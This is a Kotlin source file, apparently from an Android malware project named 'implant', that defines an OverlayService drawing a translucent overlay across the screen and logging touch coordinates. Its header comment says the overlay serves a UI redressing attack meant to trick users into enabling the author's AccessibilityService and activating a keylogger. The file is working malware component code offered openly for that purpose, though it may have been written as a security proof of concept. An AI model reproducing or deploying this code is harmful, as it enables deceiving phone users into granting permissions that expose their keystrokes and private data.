/*
* Android Service that draws an overlay over the system contents.
* This will be used to launch a UI redressing attack to trick the user into enabling our
* AccessibilityService and activating our KeyLogger.
* */
package com.cooperthecoder.implant

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.IBinder
import android.support.constraint.ConstraintLayout
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager


class OverlayService : Service(), View.OnTouchListener {

    private var windowManager: WindowManager? = null
    private var overlay: View? = null

    private val TAG: String = javaClass.name

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager?
        overlay = ConstraintLayout(this)
        overlay!!.setBackgroundColor(Color.RED)
        overlay!!.setOnTouchListener(this)
        Log.d(TAG, "Overlay created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (overlay?.windowToken == null) {
            Log.d(TAG, "Adding overlay to WindowManager")
            val lpFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
            val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    400,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    lpFlags,
                    PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.LEFT or Gravity.TOP
            params.alpha = 0.5F
            try {
                windowManager?.addView(overlay, params)
                overlay?.setOnTouchListener(this)
                Log.d(TAG, "Overlay added to WindowManager")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        Log.d(TAG, "Overlay already attached to WindowManager")
        return START_STICKY
    }

    override fun onTouch(v: View, event: MotionEvent): Boolean {
        val x = event.x
        val y = event.y
        Log.d(TAG, "Touch coordinates: ($x, $y)")
        return false
    }

    override fun onDestroy() {
        super.onDestroy()
        if (overlay?.windowToken != null) {
            windowManager?.removeView(overlay)
            overlay = null
        }
    }
}

